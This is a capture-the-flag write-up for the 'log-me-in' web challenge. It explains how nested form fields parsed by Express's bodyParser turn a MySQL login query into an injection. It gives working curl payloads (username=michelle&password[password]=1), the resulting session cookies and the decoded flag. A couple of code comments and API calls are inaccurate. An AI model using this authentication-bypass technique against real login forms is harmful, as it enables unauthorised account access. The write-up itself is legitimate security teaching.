Knowledge:
- MySQL SELECT command (for payload construction)
- Node JS (for prototype testing)

Task: We are given a login form and webserver's logic. Our goal is to login as michelle.

Investigation: 
- Test with common SQL injections. Failed
- Test with standard user/pass = admin/admin. Passed

Upon navigating through the /flag directory, we are informed that only "michelle's account" can see the flag. Since common SQL injections do not work, we need to understand how server parses the login form
Base on the given source app.js, the express server uses bodyParser module to process the form. With "extended" property is set to true, the form will be parsed with the qs library.

var bP = require("bodyParser")
var ret = bP.parse("password[age]=13")
console.log(ret) # The result is {password:{'age'='13'}}

We now have some ideas of what should be included in the form. Let's setup the local server (web, database) and how the webserver would parse our payload. We add a couple of console.log(sql) into the server source file to observe the prepared statement.

curl -v http://localhost:3000/login -d 'username=michelle&password[age]=13'
#-v tells the target webserver
#-d tells what variable we will post to the server

and we are presented with the following error

code: 'ER_BAD_FIELD_ERROR',
errno: 1054,
sqlMessage: "Unknown column 'age' in 'where clause'",
sqlState: '42S22',
index: 0,
sql: "Select * from users where username = 'michelle' and password = `age` = '13'"

This error is informative. It tells us how the final sql statement looks like, and what error we should fix to make our payload works. Since backtick is allowed, `age` is evaluated as a column. Indeed, the password part of the payload is not correctly crafted. 
Roughly speaking, we were asking for a user whose username is michelle and his password is equal to his age, which does not exist in the database. We can change the payload so that the statement becomes

Select * from users where username = 'michelle' and password = `password` = '13'

Since the password column is known, we fixed the error. However, we need to handle the '13'. Leaving it empty will cause syntax error, while filling it with random number will not give us the row with michelle's account.
MySQL evaluates the whole statement from left to right, which means that password = `password` would be compared first, then the output of the first comparison is evaluated against '13'. Since the first equality is evaluated to 1 (true), the second equality is evaluated to 0 (false), as '1'!='13'.
To solve this, we set 13 to 1. Our expected sql statement is then:

"Select * from users where username = 'michelle' and password = `password` = '1'"

while is equivalent to the following payload:

curl -v http://localhost:3000/login -d 'username=michelle&password[password]=1' 

Replacing the local address with log-me-in website, we can obtain michelle's session:

#Request
curl -v https://log-me-in.web.ctfcompetition.com/login -d'username=michelle&password[password]='1''

#Response
 POST /login HTTP/2
> Host: log-me-in.web.ctfcompetition.com
> user-agent: curl/7.68.0
> accept: */*
> content-length: 38
> content-type: application/x-www-form-urlencoded
> 
* We are completely uploaded and fine
* Connection state changed (MAX_CONCURRENT_STREAMS == 100)!
< HTTP/2 302 
< content-type: text/plain; charset=utf-8
< x-powered-by: Express
< location: /me
< vary: Accept
< set-cookie: session=eyJ1c2VybmFtZSI6Im1pY2hlbGxlIiwiZmxhZyI6IkNURnthLXByZW1pdW0tZWZmb3J0LWRlc2VydmVzLWEtcHJlbWl1bS1mbGFnfSJ9; path=/; httponly
< set-cookie: session.sig=bm5eHrmgRjBNmerS49mKNDV_tP4; path=/; httponly
< x-cloud-trace-context: 0454fe252df470a913b976399f989e68
< date: Sat, 29 Aug 2020 07:55:09 GMT
< server: Google Frontend
< content-length: 25
< 
* Connection #0 to host log-me-in.web.ctfcompetition.com left intact
Found. Redirecting to /me.

Decoding the session with base64, we obtain the flag:

{"username":"michelle","flag":"CTF{a-premium-effort-deserves-a-premium-flag}"}
